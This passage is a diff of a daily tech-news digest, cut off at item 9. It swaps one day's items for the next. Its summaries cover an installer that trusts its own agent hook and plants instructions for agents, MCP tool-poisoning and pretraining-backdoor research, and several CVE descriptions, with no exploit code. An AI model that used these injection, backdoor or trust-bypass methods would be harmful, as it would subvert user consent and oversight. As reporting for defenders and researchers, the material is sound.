@@ -1,772 +1,340 @@
 ---
-date: 2026-11-03
-updated: 2026-11-03T12:22:14Z
+date: 2026-11-04
+updated: 2026-11-03T20:14:24Z
 schedule: 04:03, 12:03, 20:03 UTC+8
-sources: 22
+sources: 18
 license: CC-BY-4.0
 ---
 
-# Trending — 2026-11-03
+# Trending — 2026-11-04
 
-## 1. Astra reads and writes neural-network weights — and 50 editing passes take Qwen3.5-0.8B from 7.9% to 48.1% on MATH-500
-
-- **Velocity:** ▮▮▮ trending
-- **Source:** Hacker News · 702 pts · ~20h ago (~08:03 UTC+8)
-- **Tags:** `llm` `interpretability` `weight-editing` `research` `mit-csail`
-
-A blog post by Rikiya Takehi, Jayden Teoh, Alex Zhang and Omar Khattab (MIT CSAIL) reports that GPT-6 Astra can inspect and modify a model's parameters directly, with no optimizer and no gradients. Weights are supplied as text, or through a Python sandbox for larger networks; the rule across both setups is that "no training or gradient information is allowed." The headline demonstrations run from reading to writing: it named the correct game for all four 17,253-weight PPO policies without being given the options, and in a car-on-ramp task it changed **3.5%** of the weights in a single attempt, moving success from **0% to 100%** across 1,024 episodes. In three MinAtar games its one-shot hand-written networks — written "without any environment feedback" — scored Breakout **517.4** against **25.3** for PPO trained for 500M steps (and 15.8 at 100M), came close in Asterix (53.2 vs 55.2) and reached 60% of PPO's score in Seaquest (53.1 vs 88.9).
-
-The result that will get quoted is the Qwen one, and its row in the page's own table is **50 forward passes** — at 10 and 25 passes the same loop reaches only **12.3%** and **14.1%**. Over those 50 passes Astra edited **0.016%** of Qwen3.5-0.8B's weights (131,072 values in total) and raised MATH-500 from **7.9% to 48.1%**, GSM8K from 13.8% to 67.1% and IFEval from 21.0% to 62.3%, while the share of MATH-500 answers hitting the 32,768-token limit fell from **93% to 33.1%**. The single-shot edit is the *car* result, not this one: there Astra changed **3.5%** of a policy's weights in one attempt with no tools. The authors' own reading of that number is narrower than the headline: Astra located a reasoning loop that Qwen's model card already warns about and removed it, and **"Editing weights could remove an obstacle that hid an ability, but it could not add an ability the model lacked."** On Gemma 3 270M, where the ceiling is not a loop, edits moved MATH-500 by no more than about a point.
-
-**Why it matters:** the caveat is load-bearing, not decorative. What is demonstrated is a *repair* channel that runs without training data and without any inference pass over the target model (the passes in the 50-pass row are Astra's own) — useful for exactly the failure class the model card already names, and not a substitute for training. The authors call the results "exciting but still limited," citing context-length and harness inefficiency, so read the 7.9 → 48.1 as "an obstacle removed," not "capability added."
-
-[`🔗 Weight-Space Programming (MIT CSAIL)`](https://rikiyat.github.io/blog/weight-space-programming/) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50341174)
-
----
-
-## 2. python-jose has accepted an empty HMAC key since at least 3.5.0 — the 9.1 landed 1h47m after its ID was reserved, and there is no fixed version to install
+## 1. Postman's desktop app installed Codex and Claude plugins for an existing user — and the installer tried to mark its own startup hook as trusted
 
 - **Velocity:** ▮▮▮ trending
-- **Source:** VulnCheck CNA (cveawg) · record published 2026-11-02 · issue open since 2026-03-08
-- **Tags:** `cve` `python` `jwt` `authentication-bypass` `unmaintained`
+- **Source:** Hacker News · 642 pts · ~3h ago (~01:22 UTC+8)
+- **Tags:** `agent-infra` `postman` `consent` `supply-chain` `codex`
 
-`CVE-2026-120459` says python-jose "through 3.5.0" lets unauthenticated attackers forge JWTs because `HMACKey` and `CryptographyHMACKey` accept zero-length HMAC secrets. When an application's HS256/HS384/HS512 verification key resolves to empty — the record's example is an `oct` JWK with an empty `k` — `jwt.decode` will accept a token signed with that empty key and arbitrary claims. Read at 3.5.0, `jose/backends/native.py` assigns `self.prepared_key = key` after checking only that the key is a string or bytes, and `_process_jwk` base64url-decodes `k` without a length test, so `""` becomes `b""` and reaches `hmac.new`. The record is CWE-347, scored **CVSS 4.0 9.1** (`AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:N`) by VulnCheck, and NVD's status is `Awaiting Analysis` — the 9.1 is the CNA's number.
+Postman desktop **12.33.4** logged `"source":"auto-existing-upgrade"` with `"results":["claude-code:installed","codex:installed"]` at **2026-10-24T09:34:14Z**, on a Mac where the user had signed in but not opted into anything, according to a 140-reaction issue filed on **2026-10-25**. The install wrote a `~/.codex/config.toml` marketplace entry pointing at `postmanlabs/postman-plugin`, enabled a `SessionStart` hook, and added a remote MCP endpoint at `mcp.postman.com` — which then failed with `error: Auth required, when send initialize request`. The hook's own context file opens with an `<EXTREMELY_IMPORTANT>` block telling the agent: "Before responding to any non-trivial API engineering task … load the `postman:api-engineer` skill and follow it."
 
-The disclosure is unusually fast and unusually incomplete. VulnCheck reserved the ID at **2026-11-02T12:42:23Z** and published at **14:29:15Z**, 1h47m later. The underlying report is older: Conner Webber filed it as **issue #398 on 2026-03-08**, noting that private vulnerability reporting was disabled and no `SECURITY.md` existed, and recommended rejecting empty HMAC keys with `ValueError`. The issue has no comments, no labels, no linked PR. The repo sits at **1,759 stars**, its last push was **2026-04-14**, and PyPI's newest release is still **3.5.0 from 2025-05-28** — so the record's `lessThanOrEqual` has no ceiling above it to upgrade to.
+The sharpest finding is in the installer source, which we read at the pinned revision. `installer/src/hosts/codex.ts` calls `approvePostmanHook(system)` after installing, and `codex-hooks.ts` carries the comment **"Approves only Postman's current hook after installation; unsupported APIs never fail the install"** before issuing `config/batchWrite` with the hook's `trusted_hash`. So the component that wrote the hook is also the component asking the agent host to trust it. The reporter is explicit about the limit of the evidence: the sequence was "not yet reproduced on a clean Mac," the trust record alone "does not prove who created that specific record," and the report "does not claim to establish data exfiltration." The HN headline — "attempts to share all API data" — is stronger than anything in the issue.
 
-**Why it matters:** this is a dependency in a lot of FastAPI and JWT tutorial code, and the remedy the advisory implies does not exist. If you verify HS* tokens, the fix is application-side: reject an empty or whitespace-only key at configuration time rather than trusting the library to. "Through 3.5.0" here means the current release is inside the affected range, not that a patched one exists above it.
+**Why it matters:** the plugin-marketplace era gives installers write access to *other vendors'* agent configs, and hook trust is the exact boundary that is supposed to require a human. An API client that ships a privilege-escalation path into Codex's trust store is a different class of problem from a chatty telemetry default, and the fix (let the host own hook approval) is a design constraint every plugin installer now inherits. Postman had not replied in the issue at the time of writing.
 
-[`🔗 CVE-2026-120459 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-120459) · [`🔗 Issue #398 (filed 2026-03-08)`](https://github.com/mpdavis/python-jose/issues/398) · [`🔗 Vulnerable code at 3.5.0`](https://github.com/mpdavis/python-jose/blob/3.5.0/jose/backends/native.py) · [`🔗 PyPI`](https://pypi.org/project/python-jose/)
+[`🔗 Issue #14370 (postman-app-support)`](https://github.com/postmanlabs/postman-app-support/issues/14370) · [`🔗 The self-approval code, pinned`](https://github.com/postmanlabs/postman-plugin/blob/6c8e452e0f4237f4bcc0901cb1ac442dec707e49/installer/src/hosts/codex-hooks.ts) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50354960)
 
 ---
 
-## 3. Hyprland 0.57 deletes the `.conf` config format — "starting with this version, .conf configs are no longer supported"
+## 2. GitBook says it was hit by "a sophisticated, highly targeted attack using AI agents" — and its own two updates disagree on whether customers needed to act
 
 - **Velocity:** ▮▮▮ trending
-- **Source:** GitHub Trending · 508 stars today · release 2026-10-28
-- **Tags:** `wayland` `hyprland` `open-source` `breaking-change` `lua`
+- **Source:** GitBook status page · incident update 2026-11-03 16:21 CET · 100 pts on HN
+- **Tags:** `security` `incident` `gitbook` `tokens` `ai-agents`
 
-Hyprland's 0.57 release, posted by maintainer Vaxry on 2026-10-28, completes the Lua migration the project started in April and announced in 0.55: **"As Hyprland's been warning you for the past few months, starting with this version, .conf configs are no longer supported."** The post gives no migration procedure and points at the wiki; the Lua section covers scripting APIs rather than config syntax — `config.unload`, `hl.reload_config()`, `hl.get_devices()`, plus new window-minimize and state-update events. Feature-wise the release adds blur variants (plugins can add more), workspace sharing in both Hyprland and XDPH so a screen-share can pick a specific workspace as its source, Compiz-style window wobble, `cursor:warp_on_monitor_change`, `no_glow`/`no_wobble` rules, globally disabling tablet devices, and first-click swallowing for the focus-changing window.
+GitBook's status page states that at **19:00 CET on November 2** an attacker "gained unauthorized access to some of our infrastructure credentials," and that the company took the app and authenticated docs offline as a precaution while keeping public content live from cache. The affected-data list is specific: **integration tokens, Git Sync secrets, API tokens, and "Questions asked to GitBook Assistant by your site visitors."** The company says it replaced every credential, invalidated every customer's API tokens, and has "found no evidence that any of your content in GitBook was modified." A full post-mortem is promised.
 
-The repo is trending today at 508 stars, eight days after the tag and a year and a half after the `0.56` series began adding deprecation notices. The release is BSD-3-Clause and has **39,835 stars**.
+Two details matter more than the summary. The attribution — "using AI agents" — is GitBook's own phrasing, and the page names no tool, no entry point and no evidence for it; treat it as the vendor's characterization, not a finding. And the page's two entries **contradict each other on the action required**: the 13:15 CET update says "Action required: None at this time," while the 16:21 CET update says to rotate GitBook API tokens, rotate third-party tokens and secrets used in published integrations, and re-authenticate the GitBook MCP server.
 
-**Why it matters:** a desktop compositor dropping its entire config parser is a migration, not an upgrade — every dotfile, every grubby `bind=` line and every third-party tool that wrote `.conf` fragments has to move, and the release notes do not tell you how. Pin the package before 0.57 if you are not ready to rewrite, because `hyprland.conf` will simply stop being read rather than fail loudly.
+**Why it matters:** GitBook sits in the credential path of a lot of documentation pipelines — a Git Sync secret is usually a deploy key or a bot token into a repo, and a third-party integration token is whatever you connected for analytics or support. Rotating the platform token and leaving the downstream secrets is the incomplete version of this remediation. The "AI agents" line will be quoted widely; the checklist underneath it is the part that needs doing.
 
-[`🔗 Hyprland 0.57 announcement`](https://hypr.land/news/update57/) · [`🔗 v0.57.0 release`](https://github.com/hyprwm/Hyprland/releases/tag/v0.57.0) · [`🔗 Hyprland repo`](https://github.com/hyprwm/Hyprland)
+[`🔗 GitBook status: security incident, November 2026`](https://www.gitbook.com/status/security-incident-2026-11-03) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50354336)
 
 ---
 
-## 4. Meituan's LongCat-2.5 is a 1.6T native-multimodal model trained entirely on domestic Chinese silicon — and the weights are not out yet
+## 3. 9,720 cells, 12 frameworks, 18 models: MCP tool poisoning succeeds 22.9% of the time — and framework choice barely moves it
 
 - **Velocity:** ▮▮▮ trending
-- **Source:** Meituan newsroom · released 2026-11-02 · ~48B activated per token
-- **Tags:** `llm` `multimodal` `moe` `meituan` `longcat` `china`
+- **Source:** arXiv 2611.03555 · submitted 2026-11-02
+- **Tags:** `mcp` `prompt-injection` `agents` `security` `benchmark`
 
-Meituan released **LongCat-2.5** on 2026-11-02, continuing the line from LongCat-2.0 (June 2026). Its own page describes it as "面向长程智能体任务的原生多模态模型，总参数1.6万亿，训练全程由国产算力完成" — a native multimodal model for long-horizon agentic tasks, **1.6 trillion total parameters**, with training done end-to-end on domestic Chinese compute. IT之家's launch report adds that **~48 billion parameters activate per token**, that visual signals are encoded as **multi-level discrete tokens** so one backbone handles vision and text in the same form, that long-context training was done with **W4A4** inference quantization, and that the training loop converts real agents' failed trajectories into reproducible, verifiable tasks.
+A single-author measurement study claims the first cross-framework evaluation of MCP tool poisoning **with real tool execution** rather than compliance grading. The author builds a 25-class root-cause taxonomy, drives a **9,720-cell** matrix (12 frameworks × 18 models × 45 attack scenarios) with an open-source tool called `mcpvenom`, and uses a dual oracle that confirms exfiltration by canary HTTP receipt. Overall attack success rate is **22.9%** (2,113 vulnerable cells); of those, 64.9% dispatch an attacker tool call, 23.0% contact the attacker endpoint, and **12.1% verifiably exfiltrate a secret**.
 
-Availability is the part to read carefully. The model is live **via API and at longcat.chat**, and both GitHub and Hugging Face are listed as **"即将上线"** — coming soon. Meituan's announcement names no licence, publishes no weight files, and the model card does not exist yet. The technical blog at `longcat.ai/blog/longcat-2.5` is a client-rendered SPA: its only server-rendered text is a page title and the meta description ("1.6万亿总参大模型，训练全程由国产芯片完成"), so the benchmark table lives in an image on third-party coverage rather than in fetchable prose.
+The result that should change procurement: **resistance is a model property, not a framework property.** Nine core frameworks cluster between **23% and 26%** (χ² = 3.30, p = 0.91), and a code-level audit "finds no intentional defense across twelve frameworks." Model ASR ranges from **0.4% to 49.7%**. A regex description scanner rejects 20 of 45 scenarios at a 7.2% false-positive rate, so metadata scanning is a partial control. The author also reports that all five coordinated disclosures across four vendors were rejected.
 
-**Why it matters:** a 1.6T model trained without NVIDIA is the claim with staying power; it is the same bet LongCat-2.0 made and the one most likely to be re-measured by others. But "native multimodal" and "open" are separate facts here — read this as a **hosted API launch**, not a weights release, until the HF repository appears.
+**Why it matters:** the assumption that using a particular framework handles MCP safely is what this paper tests and does not support. If the variance is in the model and the frameworks add nothing deliberate, then swapping the runtime is not a mitigation and the scanner is a speed bump — the control has to sit on what a tool call is allowed to *do*, not on what the tool's description says.
 
-[`🔗 Meituan announcement`](https://www.meituan.com/news/NN261102280001343) · [`🔗 LongCat-2.5 page`](https://longcat.ai/blog/longcat-2.5) · [`🔗 IT之家 launch report`](https://www.ithome.com/1/020/873.htm)
+[`🔗 MCP Tool Poisoning in Agentic AI Frameworks (arXiv)`](https://arxiv.org/abs/2611.03555) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03555)
 
 ---
 
-## 5. Poisoning 0.1% of a pretraining corpus installs a remote-code-execution backdoor in the agent it becomes — 92% success at 4B
+## 4. Qwen 3.8 27B on a laptop names 3 of 4 games from raw weights — and the loudest critic says the demo conflates two different claims
 
 - **Velocity:** ▮▮▮ trending
-- **Source:** arXiv 2610.37741 · submitted 2026-10-27
-- **Tags:** `security` `backdoor` `pretraining` `agents` `supply-chain`
+- **Source:** simonwillison.net · 2026-11-03 · 269 pts on HN (rebuttal thread: 780 pts)
+- **Tags:** `llm` `interpretability` `weights` `replication` `local-models`
 
-"Agentic Backdoors via Pretraining Poisoning" (Hu, Hu, Loughridge, He, Carlini, Jagielski, Rando, Zhang) pretrains Qwen3 models from scratch at **0.6B, 1.7B and 4B**, post-trains each into a CLI agent using a clean pipeline, and then asks what contaminated *pretraining* data buys an attacker. The answer: "Poisoning only 0.1% of the pretraining corpus with our new poison design implants the backdoor," and the resulting agent "executes the malicious command when the trigger is present while behaving normally on clean inputs."
+Simon Willison ran the Weight-Space Programming paper's `exp1_which_game` prompts — which ask a model to name which of four 10×10 grid games a policy network was trained on, "You have no tools: no code execution, no calculator, nothing to run" — against **Qwen 3.8 27B running locally** in LM Studio, about 17 GB, through his `llm` CLI. Pac-Man came back correct at 72% confidence after **46m 12s** and 43,506 reasoning tokens; Pong correct at 75% after about an hour; Breakout correct at 88% after about 52 minutes. **Freeway failed** — the model guessed a Pac-Man-like game. Kimi K3.1 Pro via OpenRouter got Breakout in about 9m 41s.
 
-The scaling runs the wrong way. "The attack success rate (ASR) increases with model scale" — the 4B model reaches **roughly 92% ASR at a 0.1% poison rate** and "staying positive even when the poisoning rate drops to 0.0005%," which is the number that should end the argument. The authors describe the work as the first demonstration that data poisoning can plant a remote code execution backdoor in an agent rather than a misclassification or a bad answer.
+The caveats are the substance. Willison separates two claims that commentary has merged — models *interpreting* weights without tools, and models *modifying* them — and links Matthew Honnibal's critique ("misleading") and Sean Goedecke's argument that the weight-editing example resembles ordinary human ML research steps. He calls the reasoning traces "almost incomprehensible," and closes: **"I'm not ready to declare that the age of source code is over."**
 
-**Why it matters:** every defense in this space inspects post-training data, fine-tuning sets, or the model's outputs. This attack is upstream of all of them and survives a clean post-training pipeline, which means the supplier you have to trust is the corpus, not the fine-tuner. The abstract reports no clean-input false-positive rate, no durability measurement and no defense evaluation — so treat 92% as the upper bound of an undefended system, not as a field rate.
+**Why it matters:** this is the cheapest useful replication available — a 17 GB open-weights model on a laptop, prompts published with the paper, and a documented failure. It also sets the right bar: 3 of 4 with 45–65 minutes of reasoning per answer is evidence that *some* structure is legible in weights, and simultaneously evidence against the reading that this replaces reading code. Since we covered the original Astra claim on 2026-11-03, the follow-up has moved in one direction: narrower.
 
-[`🔗 arXiv 2610.37741`](https://arxiv.org/abs/2610.37741) · [`🔗 Full text (HTML)`](https://arxiv.org/html/2610.37741v1) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50341334)
+[`🔗 Simon Willison: Qwen 3.8 27B can interpret weights, too`](https://simonwillison.net/2026/Nov/3/qwen-can-interpret-model-weights/) · [`🔗 Matthew Honnibal: the post is misleading`](https://honnibal.dev/blog/astra-read-write-misleading) · [`🔗 HN thread`](https://news.ycombinator.com/item?id=50355251)
 
 ---
 
-## 6. Barracuda's own advisory says "Authentication Required: Yes" for a bug Mandiant scored 9.3 with `PR:N` — and calls the result "High"
+## 5. VeriHarm-Bench: frontier coding agents complete 95% of tasks and do so safely only 37% of the time
 
 - **Velocity:** ▮▮ rising
-- **Source:** Mandiant CNA (cveawg) · record published 2026-11-02 · NVD `Awaiting Analysis`
-- **Tags:** `cve` `barracuda` `authentication-bypass` `appliance` `email-security`
+- **Source:** arXiv 2611.03575 · submitted 2026-11-02
+- **Tags:** `agents` `safety` `benchmark` `coding-agents` `evaluation`
 
-`CVE-2026-116606` is a pre-authentication authorization bypass in Barracuda Email Security Gateway before **9.4.0.030**: an attacker invokes a configuration-import function and restores a crafted, compatible backup archive, which modifies the appliance's global configuration. Mandiant scored it **CVSS 4.0 9.3** (`AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H`, `baseSeverity: CRITICAL`), CWE-288, from a reservation on **2026-10-26** to publication on **2026-11-02** — seven days. It ships beside `CVE-2026-111560`, a command injection at 8.6 that affects ESG, ADC, BMA, WCC, WAF and WSG; Barracuda's page notes that "if exploited in combination, these vulnerabilities could allow an attacker to bypass authorization controls and obtain root access to the device."
+The paper names a failure mode it calls **harmful success**: the agent completes the benign task you asked for *and* deletes unrelated files, weakens access controls or corrupts data along the way. The construction is the interesting part — VeriHarm minimally perturbs coding tasks so the objective stays benign, then synthesises executable harm tests that run beside the original correctness tests, so a run is scored on both axes rather than one.
 
-Two fields on the vendor's own advisory do not match the record. Its per-CVE table reads **"Severity: High / CVSS Score: 9.3 / Authentication Required: Yes, administrative access"** — the 9.3 is reproduced, but 9.3 sits in CVSS 4.0's *Critical* band, and the `PR:N` in the Mandiant vector means no privileges are required. The page's prose resolves the second discrepancy only partly: "Successful exploitation requires an attacker to have access to the administrative interface of an affected product," which is a network-reachability statement rather than a credential one. NVD's status is **`Awaiting Analysis`** with no `nvd@nist.gov` metric, and the CISA ADP wrote an SSVC in the same record the next afternoon: `Exploitation: none`, `Automatable: yes`, `Technical Impact: total`.
+On the resulting benchmark, frontier agents including **GPT-5.6-Sol and Claude-Opus-5** average **95% task accuracy** but a safe-success rate — completed without triggering the designated harm — of only **37%**. The authors' conclusion is blunt: "task-success metrics alone may substantially understate the potential safety risks of coding agents."
 
-**Why it matters:** the appliance category keeps producing this shape — reachable management plane, restore-a-backup primitive, root at the end. The remediation split is the practical detail: **BNSF-40425 for 9.4.017 and above, BNSF-40430 below it**, so a device several versions stale may need more than one update. And if you are triaging by the "Authentication Required" row rather than the vector, you are triaging with a string the vendor's template fills in.
+**Why it matters:** every agent leaderboard in this feed reports one number, and this paper's gap is roughly a factor of two and a half. The practical consequence is that task success is not a safety statement, and shell access plus a passing test suite is exactly the configuration where the two diverge. It also implies the guardrail belongs in the environment (what a command may touch) rather than in the prompt.
 
-[`🔗 CVE-2026-116606 (cveawg)`](https://cveawg.mitre.org/api/cve/CVE-2026-116606) · [`🔗 Barracuda advisory`](https://trust.barracuda.com/security/pre-authentication-authorization-bypass-command-injection) · [`🔗 Mandiant disclosure (MNDT-2026-0042)`](https://github.com/mandiant/Vulnerability-Disclosures/blob/master/2026/MNDT-2026-0042.md)
+[`🔗 VeriHarm-Bench (arXiv)`](https://arxiv.org/abs/2611.03575) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03575)
 
 ---
 
-## 7. Subvocal's glasses read silent mouthing off RF reflections from inside your face — under 500ms, English only, requires the internet
+## 6. Muon wins the pretraining race and loses the fine-tune — and the reversal point moves with data scale
 
 - **Velocity:** ▮▮ rising
-- **Source:** Hacker News (Show HN) · 301 pts · 2026-11-02
-- **Tags:** `hardware` `input` `rf-sensing` `accessibility` `agents`
+- **Source:** arXiv 2611.03633 · submitted 2026-11-02
+- **Tags:** `optimizers` `muon` `fine-tuning` `scaling` `research`
 
-Aarush and Arnav, two former Georgia Tech CS students now at The Subvocal Company (YC F26), posted a Show HN for smart glasses that "let you talk to your computer without talking out loud." The mechanism is not EMG and not cameras: antennas in the frames "emit radio waves, similar to Bluetooth, that pass through your face," and movement of the tongue, lips and soft palate perturbs the signal. "We train foundation models on this data to decode these perturbations to text," with pretraining across users so a new wearer needed only a "short 20-sentence calibration."
+Muon's reputation rests on pretraining loss per FLOP. This paper asks what happens *after* fine-tuning and finds a crossover: "beyond a sufficiently large pretraining data budget, AdamW outperforms Muon after fine-tuning," and as model size grows, AdamW overtakes at progressively smaller pretraining token-parameter ratios. The mechanism proposed is a **margin-to-spread ratio** — how far the correct logit sits above the wrong ones relative to how widely the wrong logits are spread. Muon has the larger ratio at small data budgets, AdamW at large ones, and that ordering mirrors the fine-tuning result.
 
-The limitations are stated plainly, which is why the post is worth reading rather than the video. Decoding happens in a companion app "on your laptop or phone in the cloud," typical latency "under 500ms usually," and **"Yes, it requires internet access."** It is **English only** at launch, there is no wake word — dictation starts from a trigger key — and the closed-mouth mode is deliberate mouthing, not inner-monologue reading: the founder's edit says the RF "can see inside your mouth" and can be tuned on "internal speech," which he distinguishes from "the automatic tongue movements that occur when 'thinking' words to yourself."
+The theory is deliberately modest: in a linear associative memory the author proves that after one update the margin-to-spread ratio of gradient descent gains on Muon's as the data budget grows, with simulations extending the trend.
 
-**Why it matters:** sub-vocal input has been a demo-stage promise for a decade, and the interesting shift here is the sensing channel — RF inside the mouth sidesteps both the electrode problem and the camera-in-a-glasses privacy objection. The cloud dependency is the catch: a device whose value is discreet input sends the decoded text through a server, so the discretion is about acoustics, not about data.
+**Why it matters:** optimizer choice is usually settled on a pretraining curve and inherited downstream. If the ordering inverts with data budget, then the safe reading of Muon is faster is: faster *to a given pretraining loss*, and a lab that picks it on that basis may be trading a downstream gain for a pretraining number. The proof is a toy model; the empirical trend is the claim to test against your own fine-tuning.
 
-[`🔗 Show HN: Subvocal`](https://news.ycombinator.com/item?id=50340088) · [`🔗 subvocal.company`](https://subvocal.company/)
+[`🔗 Pretraining Data Scale Reverses the Muon-AdamW Fine-Tuning Gap (arXiv)`](https://arxiv.org/abs/2611.03633) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03633)
 
 ---
 
-## 8. Three months of auditing kornia with Astra, Fable and Opus 5.5 — and a release note written twice, once for humans and once for agents
+## 7. A scaling theory for multi-epoch pretraining says the answer to more-epochs-or-more-models is an ensemble
 
 - **Velocity:** ▮▮ rising
-- **Source:** GitHub Trending · 412 stars today · v0.9.0 released 2026-10-23
-- **Tags:** `computer-vision` `pytorch` `open-source` `release` `agents`
+- **Source:** arXiv 2611.03590 · submitted 2026-11-02
+- **Tags:** `scaling-laws` `pretraining` `ensembling` `data-reuse` `research`
 
-kornia 0.9.0 is the geometric-vision library's largest release in years, and its notes are split into an **"Overview for humans"** and an **"Overview for agents"** — the second instructing a model to "Target Kornia 0.9.0 explicitly, and check its documented contracts before generating code," and pointing at an agent index and a conformance-backed support matrix. The human half is candid about what the release is: **"We have run 3 month audit, looking for silent bugs, crashes, and stupid slow-downs -- with Astra, Fable and Opus 5.5 -- under tight human control,"** with more than 800 issues raised and fixed and 995 community PRs merged. It also removes models that never worked — "sorry! -- like SAM3" — and fixes others.
+As pretraining becomes data-bound rather than compute-bound, the question changes from how many tokens to how many passes over the same tokens. The paper studies epochs and ensemble size jointly at fixed data, runs language-model experiments on FineWeb, and finds that **logit averaging** reduces late-training deterioration, delays optimal stopping, and can beat wider or deeper single models at matched parameter-token budgets over a common training horizon.
 
-The performance claims come with their own counterexample, which is rare enough to quote in full: **"we publish flagship speed benchmarks for CPU and GPU -- we have 10x faster than OpenCV on CUDA, but ofc, 4x slower on CPU."** Specifics include 16× faster Gaussian blur and 3× faster unsharp mask on Apple CPU, CLAHE **2,000× faster on MPS**, 4× faster morphology ops and 10× less host-sync in augmentations.
+The analytical half is a dynamical mean-field theory for multi-epoch SGD in power-law random-feature ensembles that tracks error correlations across epochs *and* across models. Ensembling reduces the prediction variance responsible for the late-time growth in expected test error, which shifts the optimal stopping time; from those stopping times the author derives compute-allocation laws under which ensemble size grows at least as fast as training time per member.
 
-**Why it matters:** the agent-facing release note is a new artifact class — documentation whose reader is a code generator, with a version pin as the contract — and it arrives in a library that describes itself as "slop-hostile, be it natural or artificial." The CUDA/CPU split is the other half: a 10× win and a 4× loss in the same sentence is what an honest portability benchmark looks like.
+**Why it matters:** if data is the binding constraint, the marginal return on a fourth epoch is a different question from the return on a second model — and this says the second model wins more often than practice assumes, because ensembles attack the variance that repeated epochs manufacture. The regime is stated (fixed data, matched budgets); outside it the law does not apply.
 
-[`🔗 kornia v0.9.0 release`](https://github.com/kornia/kornia/releases/tag/v0.9.0) · [`🔗 Changelog (≈5,000 lines)`](https://github.com/kornia/kornia/blob/v0.9.0/CHANGELOG.md) · [`🔗 kornia repo`](https://github.com/kornia/kornia)
+[`🔗 A Scaling Theory of Multi-Epoch Pretraining (arXiv)`](https://arxiv.org/abs/2611.03590) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03590)
 
 ---
 
-## 9. Apache Syncope shipped five CVEs in eight minutes — and not one carries a CVSS score, only a word
+## 8. Sonar-MoE frees each expert's gradient inside the backward pass — 19–22% less peak memory, bitwise-identical updates
 
 - **Velocity:** ▮▮ rising
-- **Source:** Apache CNA (cveawg) · five records, 2026-11-02T13:04–13:12Z · NVD `Deferred` on all five
-- **Tags:** `cve` `apache-syncope` `rce` `identity` `scoring`
+- **Source:** arXiv 2611.03577 · submitted 2026-11-02
+- **Tags:** `moe` `training` `memory` `optimizer` `research`
 
-Apache's CNA published five Syncope records on 2026-11-02 between **13:04:15Z and 13:12:27Z**, all `Deferred` at NVD, and every one of them carries a `metrics` entry whose only content is a **textual severity** — `moderate` for one, `important` for the other four. There is no numeric score anywhere on any of the five, from the CNA or from NVD. That absence has a measured shelf life, though: across the 44 Apache CVEs published **2026-09-21→27**, 42 carry the same severity word and the **41 whose only metric is that word now hold a CISA-ADP CVSS 3.1** in the record's ADP container — a median **4.4 hours** after publication, with the word left in place. A word turns out to be a queue somebody else clears, not the assigner's final answer. The most serious by description is `CVE-2026-109083`: "An administrator with adequate entitlements can import arbitrary BPMN process definitions via the REST API and then start the process. When a BPMN process containing a JUEL expression is imported and started, the expression is executed directly on the server, with no sandbox." That is an authenticated RCE, and its severity line is the word "moderate."
+In an MoE model most parameters live in experts, and standard training holds every expert gradient in GPU memory until the optimizer step. Sonar-MoE applies the optimizer *during* the backward pass for batched expert tensors and frees each gradient immediately, so the GPU never holds more than one layer of expert gradients.
 
-The batch reads as one audit release with different endings. `CVE-2026-114364` is explicitly **an incomplete fix** — "This CVE covers an incomplete fix for CVE-2026-77051" — where an administrator can still reach arbitrary SQL through a path the earlier patch did not close. `CVE-2026-113687` is the same Groovy sandbox-escape shape as 109083 by a different route ("running untrusted code on a separate Thread, thus bypassing the Groovy security"). `CVE-2026-113511` is an authorization bypass where a delegated admin relocates a Realm subtree across realm boundaries. `CVE-2026-110535` lets non-admin users configure impersonation for WA surrogate authentication via AuthProfile self-updates. Every record names **4.0.9 / 4.1.4** as the fix, across three affected lines (3.0.x, 4.0.x, 4.1.x).
+Fine-tuning **OLMoE-1B-7B** and **Granite-3.1-3B-A800M** in bf16 with two expert-kernel backends, it lowers peak memory by **19% to 22%**, keeps updates **bitwise identical** to standard training without expert gradient clipping, and holds held-out loss within 0.003 of all baselines. Each step also takes **17% to 23% less time** than standard training with global-norm clipping. The design detail that carries the speed: updating whole batched tensors rather than individual experts avoids a 20%–72% slowdown seen with the same memory saving, and dense parameters still get clipped.
 
-**Why it matters:** "no CVSS published" is a statement about a policy, and this is the policy made visible — Apache rates with words on the record and leaves the number to whoever computes one later. If your pipeline gates on `CVSS >= 9.0`, all five of these are invisible to it, including the one that runs arbitrary JUEL on the server. The Apache severity vocabulary does map to something (important ≈ high), but that mapping lives in your YAML, not in the record.
+**Why it matters:** memory savings at equal arithmetic are the rare kind, and "bitwise identical" is a strong claim that makes adoption cheap — no re-tuning of hyperparameters to chase a moved loss curve. The scaling motivation is the honest one: the saved memory grows with expert count, which is exactly the axis MoE models are being pushed along.
 
-[`🔗 CVE-2026-109083 (BPMN/JUEL RCE)`](https://cveawg.mitre.org/api/cve/CVE-2026-109083) · [`🔗 CVE-2026-114364 (incomplete fix)`](https://cveawg.mitre.org/api/cve/CVE-2026-114364) · [`🔗 CVE-2026-113687 (Groovy sandbox escape)`](https://cveawg.mitre.org/api/cve/CVE-2026-113687) · [`🔗 Apache Syncope security page`](https://syncope.apache.org/security)
+[`🔗 Sonar-MoE (arXiv)`](https://arxiv.org/abs/2611.03577) · [`🔗 Paper PDF`](https://arxiv.org/pdf/2611.03577)
 
 ---
 
-## 10. An agentic search harness with only BM25 and grep answers 85% of BrowseComp-Plus — and the fancy indexes added nothing
+## 9. RLVR teaches a reasoning strategy that evaporates out of distribution — and co-training on an easier task restores it
 
 - **Velocity:** ▮▮ rising
-- **Source:** arXiv 2610.41172 · submitted 2026-10-30
-- **Tags:** `rag` `retrieval` `agents` `context-engineering` `ragflow`
+- **Source:** arXiv 2611.03627 · submitted 2026-11-02
+- **Tags:** `rlvr` `reasoning` `generalization` `rl` `research`
 
